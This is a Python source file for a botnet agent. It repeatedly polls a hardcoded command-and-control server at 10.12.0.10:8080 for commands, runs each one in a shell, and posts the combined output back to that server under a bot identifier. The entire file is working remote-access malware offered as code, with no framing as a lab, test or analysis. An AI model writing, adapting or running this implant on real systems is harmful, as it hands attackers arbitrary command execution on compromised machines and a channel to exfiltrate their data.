#!/usr/bin/env python3

import json
import socket
import subprocess
import time
import urllib.request
import urllib.error
from typing import Optional
C2_HOST = "10.12.0.10"
C2_PORT = 8080
C2_URL  = f"http://{C2_HOST}:{C2_PORT}"
POLL_INTERVAL = 2  # seconds between polls


def get_bot_id() -> str:
    """Return our own IP address as the bot identifier."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((C2_HOST, C2_PORT))
        return s.getsockname()[0]
    finally:
        s.close()


def poll_command() -> Optional[str]:
    """Fetch the current command from the C2. Returns None on failure."""
    try:
        with urllib.request.urlopen(f"{C2_URL}/command", timeout=3) as resp:
            data = json.loads(resp.read().decode())
            return data.get("cmd")
    except urllib.error.URLError:
        return None


def execute(command: str) -> str:
    """Run command in a shell, return combined stdout+stderr."""
    proc = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=10
    )
    output = proc.stdout + proc.stderr
    return output.strip() if output.strip() else "(no output)"


def post_result(bot_id: str, result: str) -> None:
    """POST the execution result back to the C2."""
    data = json.dumps({"bot_id": bot_id, "result": result}).encode()
    req  = urllib.request.Request(
        f"{C2_URL}/result",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    urllib.request.urlopen(req, timeout=3)


def main() -> None:
    bot_id = get_bot_id()
    print(f"- Started  id={bot_id}  C2={C2_URL}")
    print(f"- Polling every {POLL_INTERVAL} s...")

    last_command = None

    try:
        while True:
            command = poll_command()

            if command and command != last_command:
                print(f"- New command received: {command}")
                try:
                    result = execute(command)
                except subprocess.TimeoutExpired:
                    result = "Command timed out after 10 s"
                print(f"- Result: {result[:80]}")
                try:
                    post_result(bot_id, result)
                    print(f"- Result sent to C2")
                except urllib.error.URLError as e:
                    print(f"X Failed to send result: {e.reason}")
                last_command = command

            time.sleep(POLL_INTERVAL)

    except KeyboardInterrupt:
        print(f"\n- Stopped.")


if __name__ == "__main__":
    main()
